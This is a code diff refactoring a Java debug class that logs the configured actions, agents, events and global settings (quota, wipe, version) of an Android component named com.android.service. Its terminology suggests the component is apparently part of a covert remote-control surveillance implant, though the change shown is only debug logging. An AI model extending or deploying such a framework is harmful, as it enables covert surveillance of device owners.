@@ -7,13 +7,15 @@
 
 package com.android.service;
 
+import java.util.HashMap;
+import java.util.Iterator;
+
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
-import com.android.service.agent.AgentConf;
-import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
-import com.android.service.conf.Option;
-import com.android.service.event.EventConf;
+import com.android.service.conf.ConfModule;
+import com.android.service.conf.ConfEvent;
+import com.android.service.conf.Globals;
 import com.android.service.util.Check;
 
 // Debugging class
@@ -40,7 +42,7 @@ public class Debug {
 	/**
 	 * Status actions.
 	 */
-	public static void StatusActions() {
+	public static void statusActions() {
 		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
@@ -52,21 +54,20 @@ public class Debug {
 				final Action a = status.getAction(i);
 
 				if (Cfg.DEBUG) {
-					Check.log(" Action Id: " + a.getId() + " sub num: " + a.getSubActionsNum()); //$NON-NLS-1$ //$NON-NLS-2$
+					Check.log(" Action (" + a.getId() + ") " + a.getDesc()); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				for (int j = 0; j < a.getSubActionsNum(); j++) {
 					final SubAction s = a.getSubAction(j);
 
 					if (Cfg.DEBUG) {
-						Check.log("  -> SubAction " + j + " Type: " + s.getSubActionType() + " Params len: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-								+ s.getSubActionParams().length);
+						Check.log("  -> " + s); //$NON-NLS-1$ //$NON-NLS-2$ 
 					}
 				}
 			}
 		} catch (final GeneralException rcse) {
 			if (Cfg.DEBUG) {
-				Check.log(rcse) ;//$NON-NLS-1$
+				Check.log(rcse);//$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
 				Check.log(" RCSException detected in Debug.StatusActions()"); //$NON-NLS-1$
@@ -81,26 +82,26 @@ public class Debug {
 	/**
 	 * Status agents.
 	 */
-	public static void StatusAgents() {
+	public static void statusModules() {
 		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
 			Check.log(" Status Agents Begins"); //$NON-NLS-1$
 		}
 
-		int agentsNumber = status.getAgentsNumber();
+		HashMap<String, ConfModule> agents = status.getAgentsMap();
+		final Iterator<String> it = agents.keySet().iterator();
 
-		for (final int at : AgentType.values()) {
-			try {
-				final AgentConf a = status.getAgent(at);
-
-				if (Cfg.DEBUG) {
-					Check.log(" Agent Id: " + a.getId() + " Params len: " + a.getParams().length); //$NON-NLS-1$ //$NON-NLS-2$
-				}
-			} catch (final GeneralException rcse) {
-				// No need to print that this agent doesn't exist
-				agentsNumber++;
+		while (it.hasNext()) {
+			final String key = it.next();
+			if (Cfg.DEBUG) {
+				Check.asserts(key != null, "null type"); //$NON-NLS-1$
 			}
+			final ConfModule a = agents.get(key);
+			if (Cfg.DEBUG) {
+				Check.log(" Agent " + a.getType() + " " + a); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+
 		}
 
 		if (Cfg.DEBUG) {
@@ -111,7 +112,7 @@ public class Debug {
 	/**
 	 * Status events.
 	 */
-	public static void StatusEvents() {
+	public static void statusEvents() {
 		final Status statusObj = Status.self();
 
 		if (Cfg.DEBUG) {
@@ -120,11 +121,10 @@ public class Debug {
 
 		for (int i = 0; i < statusObj.getEventsNumber(); i++) {
 			try {
-				final EventConf e = statusObj.getEvent(i);
+				final ConfEvent e = statusObj.getEvent(i);
 
 				if (Cfg.DEBUG) {
-					Check.log(" Event Id: " + e.getId() + " Event Type: " + e.getType() + " Params len: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-							+ e.getParams().length);
+					Check.log(" Event (" + e.getId() + ") " + e.getType() + " [" + e.desc+"] " + e); //$NON-NLS-1$ //$NON-NLS-2$ 							
 				}
 			} catch (final GeneralException rcse) {
 				// No need to print that this agent doesn't exist
@@ -139,31 +139,24 @@ public class Debug {
 	/**
 	 * Status options.
 	 */
-	public static void StatusOptions() {
-		final Status statusObj = Status.self();
+	public static void statusGlobals() {
+		final Status status = Status.self();
 
 		if (Cfg.DEBUG) {
-			Check.log(" Status Options Begins"); //$NON-NLS-1$
+			Check.log(" Status Global Begins"); //$NON-NLS-1$
 		}
 
-		int optionsNumber = statusObj.getOptionssNumber();
-
-		// CONFIGURATION_WIFIIP is the actual last option
-		for (int i = 0; i < optionsNumber && i < Option.CONFIGURATION_WIFIIP + 2; i++) {
-			try {
-				final Option o = statusObj.getOption(Option.CONFIGURATION + i + 1);
-
-				if (Cfg.DEBUG) {
-					Check.log(" Option Id: " + o.getId() + " Option Type: " + " Params len: " + o.getParams().length); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-				}
-			} catch (final GeneralException rcse) {
-				// No need to print that this agent doesn't exist
-				optionsNumber++;
-			}
+		Globals g = status.getGlobals();
+		if (Cfg.DEBUG) {
+			Check.log(" quota min: " + g.quotaMin + " max:" + g.quotaMax); //$NON-NLS-1$ 
+			Check.log(" wipe: " + g.wipe); //$NON-NLS-1$ 
+			Check.log(" type: " + g.type); //$NON-NLS-1$ 
+			Check.log(" migrated: " + g.migrated); //$NON-NLS-1$ 
+			Check.log(" versin: " + g.version); //$NON-NLS-1$ 
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(" Status Options Ends"); //$NON-NLS-1$
+			Check.log(" Status Global Ends"); //$NON-NLS-1$
 		}
 	}
 
